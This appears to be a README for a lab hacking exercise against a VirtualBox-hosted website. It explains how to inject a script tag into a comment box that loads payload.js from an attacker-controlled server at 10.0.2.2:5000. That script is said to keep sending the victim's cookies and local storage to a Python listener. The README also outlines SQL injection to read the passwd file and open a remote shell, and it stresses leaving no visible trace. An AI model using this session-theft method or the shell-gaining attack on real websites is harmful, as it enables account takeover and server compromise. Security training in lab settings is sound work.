# Instruction

These files are used to attack to the lab machine, purpose: gain the admin access to the website.

Attack scenarios must be conduted completely from the client's side (i.e the brower). There are 
two strict requirements:
- Cannot look or inspect the server's code directly, like the real world - a blind attack.
- Any attacks with visible trace (example: a broken image icon, an invisible comment) are not accepted.

There are 2 phases in this attack: 
- Cross-site scripting to gain the admin access to website.
- SQL injectionto show the sensitive file (the `passwd` file) and pull out a remote shell that allow the attacker to execute
commands including listing, manipulating servers's host machine.

# How to run

The `payload.js` is a simple function with purpose to be injected directly in the website, find a comment box, or any box that
seems legitimate to put it on. Wrap this file in a HTML tag will make it work. For example:
```text
This is a cool blog, I like its design <script src="http://10.0.2.2:5000/payload.js"></script>
```

Replace `10.0.2.2:5000` with correct IP before using (in this case, the website was hosted inside host machine via Virtual Box, so
that the IP should be 10.0.2.2), moreover the port can be changed via server code, choose any free port as you want.

`payload.js` will continuously grab any cookie (shoud quit the website if opening to avoid the cookies messed up) or any data in the
local storage and sends them to the listening server.

`get_cookies.py` is a listening server, run with Python, decode the payload and show the cookie, with location.

To run the server:

```Python
python -m venv name_of_the_virtual_env
source path/to/venv/bin/activate
pip install requests

python run get_cookies.py
```

